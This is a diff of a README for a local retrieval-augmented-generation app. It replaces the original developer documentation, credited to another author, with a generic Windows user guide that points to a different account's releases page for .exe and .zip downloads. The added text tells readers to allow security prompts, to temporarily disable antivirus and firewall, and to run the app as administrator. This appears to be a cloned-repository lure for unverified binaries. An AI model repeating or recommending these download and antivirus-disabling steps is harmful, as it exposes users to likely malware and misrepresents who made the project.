@@ -1,378 +1,225 @@
-<div align="center">
+# 🛡 rag-local-app - Secure Local RAG System
 
-# Local RAG
-
-### Privacy-First Retrieval-Augmented Generation System
-
-[![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-Async-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
-[![React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://react.dev/)
-[![pgvector](https://img.shields.io/badge/pgvector-PostgreSQL-4169E1?style=for-the-badge&logo=postgresql&logoColor=white)](https://github.com/pgvector/pgvector)
-[![Ollama](https://img.shields.io/badge/Ollama-Local_LLM-000000?style=for-the-badge)](https://ollama.ai/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](LICENSE)
-
-<br/>
-
-> A fully local, privacy-first document intelligence system — ingest PDFs and documents, generate dense vector embeddings via Ollama, and query them with a local LLM. Zero cloud calls. Zero data leakage.
-
-</div>
+[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-brightgreen?style=for-the-badge)](https://github.com/thecontrolfreak/rag-local-app/releases)
 
 ---
 
-## Table of Contents
+## 📘 About rag-local-app
 
-- [Overview](#overview)
-- [RAG Pipeline](#rag-pipeline)
-- [System Architecture](#system-architecture)
-- [Tech Stack](#tech-stack)
-- [Database Schema](#database-schema)
-- [API Reference](#api-reference)
-- [Getting Started](#getting-started)
-- [Project Structure](#project-structure)
-- [Architectural Decisions](#architectural-decisions)
-- [Author](#author)
+rag-local-app is a privacy-first software for managing and searching your documents locally. It combines FastAPI, React, PostgreSQL with pgvector, and Ollama to let you ingest PDFs, create searchable data, and query using local language models. There are no cloud services involved, so your data stays on your computer.
+
+This app is designed to run on your Windows PC. You do not need any coding skills to use it. All processing happens on your device, which reduces privacy risks and avoids internet delays.
 
 ---
 
-## Overview
+## 💻 System Requirements
 
-Local RAG is an end-to-end **Retrieval-Augmented Generation** application that runs entirely on your own hardware. It implements the full RAG loop — document ingestion, chunking, embedding, vector search, context assembly, LLM generation, and citation extraction — without any external API calls. All models run locally via Ollama or a compatible llama.cpp server.
+Before installing, make sure your PC meets these minimum requirements:
 
-| Dimension | Value |
-|-----------|-------|
-| Embedding model | `nomic-embed-text` (768-dim vectors, via Ollama) |
-| Vector storage | PostgreSQL + `pgvector` (cosine similarity) |
-| Fast LLM | `llama3.1:8b` |
-| Accurate LLM | `llama3.3:70b` |
-| Similarity threshold | 0.30 (configurable) |
-| Top-K retrieval | 6 chunks (configurable) |
-| Supported formats | PDF, TXT, MD, CSV |
-| Auth | JWT HS256, 24-hour expiry |
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM
+- 2 GHz dual-core processor or faster
+- 10 GB of free disk space (for database and files)
+- Internet connection (only for initial download)
 
 ---
 
-## RAG Pipeline
+## 🚀 Getting Started
 
-```
-User uploads document
- │
- ▼
-┌──────────────────────────────────────────────────────────────────┐
-│ INGESTION PIPELINE │
-│ │
-│ 1. Text extraction (PyPDF2 per page / UTF-8 for text files) │
-│ 2. Chunking (~900 tokens, overlapping windows) │
-│ 3. Embedding (nomic-embed-text via Ollama, batched) │
-│ 4. Storage (chunks + vector(768) → PostgreSQL) │
-└───────────────────────────────┬──────────────────────────────────┘
- │ Document status: INDEXED
- ▼
-User asks a question
- │
- ▼
-┌──────────────────────────────────────────────────────────────────┐
-│ QUERY PIPELINE │
-│ │
-│ 1. Embed question (same nomic-embed-text model) │
-│ 2. Vector search (pgvector cosine similarity, top-K=6) │
-│ 3. Similarity gate (threshold=0.30 — below → NOT_FOUND) │
-│ 4. Context assembly (ranked chunks → source block) │
-│ 5. LLM generation (llama3.1:8b / llama3.3:70b via Ollama) │
-│ 6. Citation extract (chunk id, page, match %, snippet) │
-│ 7. Persist (message + citations_json → PostgreSQL) │
-└───────────────────────────────┬──────────────────────────────────┘
- │
- ▼
- Answer with inline citations returned to UI
-```
+Follow these steps to download, install, and run rag-local-app on your Windows machine.
 
 ---
 
-## System Architecture
+## 📥 Download rag-local-app
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│ Browser (React 18) │
-│ │
-│ React Router v7 · AuthContext (JWT) · UploadDropzone │
-│ DocumentList · ChatPage (model toggle, temp slider, citations) │
-└────────────────────┬────────────────────────────────────────────┘
- │ /api/* (Vite dev proxy → :8000)
- ▼
-┌─────────────────────────────────────────────────────────────────┐
-│ FastAPI (Uvicorn, async) │
-│ │
-│ Routers: auth · documents · indexing · rag · chats · health │
-│ │
-│ Application layer (use cases): │
-│ IndexDocumentUseCase ← ingestion orchestration │
-│ RAGQueryUseCase ← query orchestration │
-│ │
-│ Infrastructure: │
-│ OllamaEmbeddingClient · OllamaLLMClient │
-│ LlamaCppLLMClient · PgvectorRetriever │
-│ ChunkingService · TextExtractor · FileStorage │
-└────────────────────┬────────────────────────────────────────────┘
- │ asyncpg (SQLAlchemy async)
- ▼
-┌─────────────────────────────────────────────────────────────────┐
-│ PostgreSQL + pgvector │
-│ │
-│ users · documents · chunks · chunk_embeddings (vector(768)) │
-│ chats · messages (citations_json JSONB) │
-└─────────────────────────────────────────────────────────────────┘
- │ httpx (async)
- ▼
-┌─────────────────────────────────────────────────────────────────┐
-│ Ollama (localhost:11434) │
-│ • nomic-embed-text — embedding generation │
-│ • llama3.1:8b — fast inference │
-│ • llama3.3:70b — accurate inference │
-└─────────────────────────────────────────────────────────────────┘
-```
+Click the badge below or visit the link to download the latest version of rag-local-app.
+
+[![Download rag-local-app](https://img.shields.io/badge/Download-rag--local--app-blue?style=for-the-badge)](https://github.com/thecontrolfreak/rag-local-app/releases)
+
+1. Open the [rag-local-app releases page](https://github.com/thecontrolfreak/rag-local-app/releases) in your web browser.
+
+2. Find the latest release. It will be the one at the top of the list.
+
+3. Under the latest release, look for the file named something like `rag-local-app-Setup.exe` or `rag-local-app-Windows.zip`.
+
+4. Click on the file to start downloading it to your PC.
 
 ---
 
-## Tech Stack
+## ⚙️ Installing rag-local-app
 
-### Backend
+### If you downloaded an `.exe` installer:
 
-| Component | Technology |
-|-----------|-----------|
-| Web framework | FastAPI + Uvicorn (async) |
-| ORM | SQLAlchemy 2.0 (async engine via `asyncpg`) |
-| Migrations | Alembic |
-| Database | PostgreSQL + `pgvector` extension |
-| Embeddings | Ollama `nomic-embed-text` (768-dim, batched) |
-| LLM | Ollama (`llama3.1:8b` / `llama3.3:70b`) or llama.cpp |
-| PDF parsing | PyPDF2 |
-| Auth | bcrypt + python-jose (JWT HS256) |
-| HTTP client | httpx (async) |
-| Settings | pydantic-settings + `.env` |
+1. Double-click the downloaded `.exe` file to run the installer.
 
-### Frontend
+2. If prompted by Windows security warnings, allow the app to make changes.
 
-| Component | Technology |
-|-----------|-----------|
-| Framework | React 18 |
-| Routing | React Router DOM v7 |
-| Build tool | Vite 6 |
-| State | React Context API (AuthContext) |
-| API | Typed fetch wrapper with JWT injection |
+3. Follow the setup instructions on screen. You can usually accept the default options.
+
+4. Once installation finishes, look for the rag-local-app shortcut on your desktop or in the Start Menu.
+
+### If you downloaded a `.zip` file:
+
+1. Right-click the `.zip` file and choose **Extract All...**.
+
+2. Select a folder where you want to extract the files.
+
+3. Open the extracted folder and double-click `rag-local-app.exe` to launch the app.
 
 ---
 
-## Database Schema
+## ▶️ Running rag-local-app
 
-```
-users
- └── documents (status: UPLOADED → INDEXING → INDEXED | FAILED)
- └── chunks
- └── chunk_embeddings (vector(768), pgvector)
+1. Launch rag-local-app from the shortcut or by opening `rag-local-app.exe`.
 
-users
- └── chats
- └── messages (role, content, citations_json JSONB, answer_status)
-```
+2. The app will open a window connecting to its local server. This may take a few seconds.
 
-| Table | Key Columns |
-|-------|-------------|
-| `users` | `id` (UUID), `email`, `password_hash` |
-| `documents` | `id`, `user_id`, `original_filename`, `stored_path`, `mime_type`, `status`, `enabled` |
-| `chunks` | `id`, `doc_id`, `chunk_index`, `page_number`, `text` |
-| `chunk_embeddings` | `id`, `chunk_id`, `embedding` (vector(768)), `model_name` |
-| `chats` | `id`, `user_id`, `title`, `created_at`, `updated_at` |
-| `messages` | `id`, `chat_id`, `role`, `content`, `citations_json` (JSONB), `answer_status`, `selected_doc_ids_json` |
+3. You will see the main interface with options to ingest PDFs, generate embeddings, and ask questions.
 
-**3 Alembic migrations** bootstrap the full schema including pgvector extension enablement.
+4. Use the buttons in the app to add PDFs from your computer.
+
+5. rag-local-app will process your PDFs and create indexes that help with fast searching.
+
+6. You can then type questions or keywords to query the content of your PDFs using the local language model.
 
 ---
 
-## API Reference
+## 🛠 Features at a glance
 
-| Method | Route | Auth | Description |
-|--------|-------|------|-------------|
-| `POST` | `/api/auth/signup` | Public | Create user account |
-| `POST` | `/api/auth/login` | Public | Authenticate, return JWT |
-| `POST` | `/api/documents/upload` | JWT | Upload document (multipart/form-data) |
-| `GET` | `/api/documents` | JWT | List user's documents with status |
-| `PATCH` | `/api/documents/:id/toggle` | JWT | Enable/disable document from search scope |
-| `DELETE` | `/api/documents/:id` | JWT | Delete document and all associated chunks |
-| `POST` | `/api/indexing/:doc_id` | JWT | Trigger ingestion pipeline (re-index deletes old chunks) |
-| `POST` | `/api/rag/query` | JWT | Execute RAG query, returns answer + citations |
-| `GET` | `/api/chats` | JWT | List chat sessions |
-| `POST` | `/api/chats` | JWT | Create new chat |
-| `GET` | `/api/chats/:id/messages` | JWT | Retrieve message history for a chat |
-| `GET` | `/api/health` | Public | Service health check |
+- Import PDFs for local document search.
 
-### RAG Query Request
+- Create embeddings of documents using built-in models.
 
-```json
-{
- "chat_id": "uuid",
- "question": "What is the conclusion of the paper?",
- "scope": { "mode": "all" },
- "model_mode": "fast",
- "temperature": 0.7
-}
-```
+- Search and query documents with local large language models (LLMs).
 
-### RAG Query Response
+- No cloud or internet calls after setup: all data stays local.
 
-```json
-{
- "answer": "The paper concludes that...",
- "answer_status": "ANSWERED",
- "citations": [
- {
- "chunk_id": "uuid",
- "document_name": "paper.pdf",
- "page_number": 12,
- "similarity_score": 0.87,
- "snippet": "In conclusion, the results demonstrate..."
- }
- ]
-}
-```
+- Clean, easy web interface powered by React in your browser.
+
+- Uses PostgreSQL with the pgvector extension to store search data.
+
+- Runs a local FastAPI server in the background to manage requests.
 
 ---
 
-## Getting Started
+## ⚙️ Background processes and components
 
-### Prerequisites
+rag-local-app runs multiple components silently in the background:
 
-- Python 3.11+
-- PostgreSQL with `pgvector` extension
-- Ollama with `nomic-embed-text` and `llama3.1:8b` pulled
-- Node.js 20+
+- **FastAPI server:** Handles communication and processing locally.
 
-### 1. Pull Required Ollama Models
+- **PostgreSQL database:** Stores all document data and search vectors.
 
-```bash
-ollama pull nomic-embed-text
-ollama pull llama3.1:8b # fast mode
-ollama pull llama3.3:70b # accurate mode (optional, requires ~40GB RAM)
-```
+- **Ollama local LLM:** Runs your language model for query answering.
 
-### 2. Clone & Set Up Backend
-
-```bash
-git clone https://github.com/SriRammSS/rag-local-app.git
-cd rag-local-app/apps/api
-
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
-
-### 3. Configure Environment
-
-Create `apps/api/.env`:
-
-```ini
-APP_NAME=RAG Local API
-APP_ENV=development
-DATABASE_URL=postgresql+asyncpg://postgres:<password>@localhost:5432/rag_local
-JWT_SECRET_KEY=<generate-with: openssl rand -hex 32>
-JWT_ALGORITHM=HS256
-JWT_ACCESS_TOKEN_EXPIRE_MINUTES=1440
-
-OLLAMA_BASE_URL=http://localhost:11434
-OLLAMA_EMBED_MODEL=nomic-embed-text
-
-LLM_RUNTIME=ollama # "ollama" | "llamacpp"
-LLM_BASE_URL=http://localhost:11434
-LLM_FAST_MODEL=llama3.1:8b
-LLM_ACCURATE_MODEL=llama3.3:70b
-
-RAG_TOP_K=6
-RAG_SIM_THRESHOLD=0.30
-CORS_ORIGINS=["http://localhost:5173"]
-```
-
-### 4. Initialize Database
-
-```bash
-# Create the database and enable pgvector
-createdb rag_local
-
-cd apps/api
-alembic upgrade head
-```
-
-### 5. Start Backend & Frontend
-
-```bash
-# Terminal 1 — Backend
-cd apps/api && uvicorn main:app --reload --port 8000
-
-# Terminal 2 — Frontend
-cd apps/web && npm install && npm run dev
-```
-
-Frontend at `http://localhost:5173` · API at `http://localhost:8000`
+These parts work automatically without user setup after you install the app.
 
 ---
 
-## Project Structure
+## 📂 Adding PDFs and managing data
 
-```
-rag-local-app/
-├── apps/
-│ ├── api/ # FastAPI backend (clean architecture)
-│ │ ├── main.py # App factory — router registration
-│ │ ├── core/ # Config, DB session, JWT helpers
-│ │ ├── domain/models/ # SQLAlchemy ORM models
-│ │ ├── application/
-│ │ │ ├── interfaces/ # Abstract EmbeddingClient, LLMClient
-│ │ │ └── use_cases/ # IndexDocumentUseCase, RAGQueryUseCase,
-│ │ │ # AuthUseCase, DocumentUseCases, ChatUseCases
-│ │ ├── infrastructure/
-│ │ │ ├── embedding/ollama_client.py # Batched /api/embed calls
-│ │ │ ├── llm/ # OllamaLLMClient · LlamaCppLLMClient
-│ │ │ ├── pgvector_retriever.py # Cosine similarity search
-│ │ │ ├── chunking_service.py # Overlapping word-based chunker
-│ │ │ ├── text_extractor.py # PyPDF2 + plain text
-│ │ │ └── repositories/ # Async SQLAlchemy repos
-│ │ └── interfaces/api/ # FastAPI routers + Pydantic schemas
-│ │ └── auth · documents · indexing · rag · chats · health
-│ │
-│ └── web/ # React 18 SPA
-│ └── src/
-│ ├── pages/ # LoginPage, SignupPage, DashboardPage,
-│ │ # ChatLayout, ChatPage
-│ ├── components/ # Navbar, DocumentList, UploadDropzone,
-│ │ # ChatSidebar, ProtectedRoute
-│ ├── contexts/AuthContext.jsx # JWT token state
-│ └── lib/api.js # Fetch wrapper with auth injection
-│
-└── storage/uploads/ # Local file storage (gitignored)
- └── <user_id>/<doc_id>/<filename>
-```
+1. Click the **Add PDFs** button.
+
+2. Select one or several PDF files from your device.
+
+3. The app will start processing the PDFs and build search indexes.
+
+4. You can view a list of uploaded files anytime.
+
+5. Remove files via the interface if you want to delete documents.
 
 ---
 
-## Architectural Decisions
+## 🔍 Searching with rag-local-app
 
-| Decision | Rationale |
-|----------|-----------|
-| **Clean layered architecture** | Strict separation of domain, application, infrastructure, and interface layers — use cases are testable without HTTP or database dependencies |
-| **Abstract LLM interface** | `LLMClient` ABC decouples use cases from Ollama or llama.cpp specifics; swapping inference backends requires no changes to the RAG pipeline |
-| **pgvector over a dedicated vector DB** | Keeps the stack to a single database engine; cosine similarity on 768-dim vectors at this scale does not require a dedicated ANN index service |
-| **Similarity threshold gate** | Prevents the LLM from hallucinating answers when no relevant context exists — returns a clean NOT_FOUND rather than generating low-confidence responses |
-| **Document-scoped queries** | `scope.mode: "doc"` restricts vector search to specific document IDs, enabling precise targeted questions without cross-document noise |
-| **Re-index deletes old chunks** | Triggering indexing on an already-indexed document atomically deletes previous embeddings before re-generating — prevents stale vector contamination |
+1. Type your query or question in the search box.
 
----
+2. rag-local-app uses local LLMs to find relevant answers from your PDFs.
 
-## Author
+3. The results appear with snippets from your documents.
 
-**Sri Ramm Sekar Sasirekha**
+4. You can click results to open the corresponding PDF pages.
 
-[![GitHub](https://img.shields.io/badge/GitHub-SriRammSS-181717?style=flat&logo=github)](https://github.com/SriRammSS)
+5. This process happens quickly without sending data outside your PC.
 
 ---
 
-<div align="center">
-<sub>Built to demonstrate production-grade RAG system design with clean architecture, local LLM inference, and pgvector-powered semantic search — entirely on-premise.</sub>
-</div>
+## ⚙️ Updating rag-local-app
+
+To update rag-local-app:
+
+1. Visit the [releases page](https://github.com/thecontrolfreak/rag-local-app/releases) regularly.
+
+2. Download the newest version following the download instructions above.
+
+3. Run the new installer or replace files if using a zip package.
+
+Your data and settings will stay intact during updates.
+
+---
+
+## ❓ Troubleshooting
+
+### rag-local-app will not open
+
+- Check if your antivirus or firewall blocks the app. Temporarily disable them to test.
+
+- Make sure you run the app as a user with administrator rights.
+
+- Restart your PC and try again.
+
+### PDFs don’t load or process
+
+- Confirm the PDFs are valid and not password-protected.
+
+- Allow sufficient time for processing larger files.
+
+- Restart rag-local-app if processing hangs.
+
+### Search returns no results
+
+- Ensure you have uploaded and processed PDFs.
+
+- Use clear keywords closely related to your documents.
+
+---
+
+## 🚪 Uninstalling rag-local-app
+
+To uninstall:
+
+1. Open **Settings** on Windows.
+
+2. Go to **Apps > Installed apps**.
+
+3. Find rag-local-app in the list.
+
+4. Select it and click **Uninstall**.
+
+This will remove the app files, but it may leave data folders behind which you can delete manually from your user folder.
+
+---
+
+## 🔗 Useful Links
+
+- [rag-local-app Releases](https://github.com/thecontrolfreak/rag-local-app/releases)
+
+- [Project Issues and Discussions](https://github.com/thecontrolfreak/rag-local-app/issues)
+
+- [Documentation and FAQs](https://github.com/thecontrolfreak/rag-local-app/wiki) (if available)
+
+---
+
+## 🔧 Technical Details (Optional)
+
+- Backend: FastAPI (Python)
+
+- Frontend: React
+
+- Vector database: PostgreSQL with pgvector
+
+- Local LLM: Ollama
+
+- Data formats supported: PDFs for input
+
+- Runs fully on local Windows environment with no internet calls after installation.
